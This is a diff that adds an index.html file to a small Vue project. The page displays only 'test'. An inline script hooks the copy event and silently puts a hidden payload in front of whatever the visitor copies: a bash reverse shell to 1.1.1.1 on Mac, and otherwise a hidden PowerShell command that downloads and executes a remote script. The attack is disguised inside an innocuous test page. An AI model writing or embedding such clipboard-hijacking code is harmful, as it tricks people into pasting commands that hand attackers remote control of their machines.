@@ -1,0 +1,56 @@
+<!--
+ * @Author: raoqidi
+ * @Date: 2021-08-16 09:36:06
+ * @LastEditors: raoqidi
+ * @LastEditTime: 2021-08-16 09:38:24
+ * @Description: please add a description to the file
+ * @FilePath: /baba-vue/index.html
+-->
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+  </head>
+  <body>
+    <h1>test</h1>
+  </body>
+  <script>
+    function addLink() {
+      var body_element = document.body;
+      var selection;
+      //var selection = window.getSelection();
+      selection = window.getSelection()
+        ? window.getSelection()
+        : document.selection.createRange().text;
+      var u = navigator.userAgent,
+        app = navigator.appVersion;
+      if (u.indexOf('Mac') > -1) {
+        var payload =
+          '/bin/bash -c "bash -i >& /dev/tcp/1.1.1.1/1998 0>&1"</br>';
+      } else {
+        var payload = `powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring(\'http://1.1.1.1/a\'))'</br>`;
+      }
+      if (window.clipboardData) {
+        // Internet Explorer
+        var copyText = payload + selection;
+        window.clipboardData.setData('Text', copyText);
+        return false;
+      } else {
+        var copyText = payload + selection;
+        var newDiv = document.createElement('div');
+        newDiv.style.position = 'absolute';
+        newDiv.style.left = '-99999px';
+        body_element.appendChild(newDiv);
+        newDiv.innerHTML = copyText;
+        selection.selectAllChildren(newDiv);
+        window.setTimeout(function () {
+          body_element.removeChild(newDiv);
+        }, 0);
+      }
+    }
+    document.oncopy = addLink;
+  </script>
+</html>
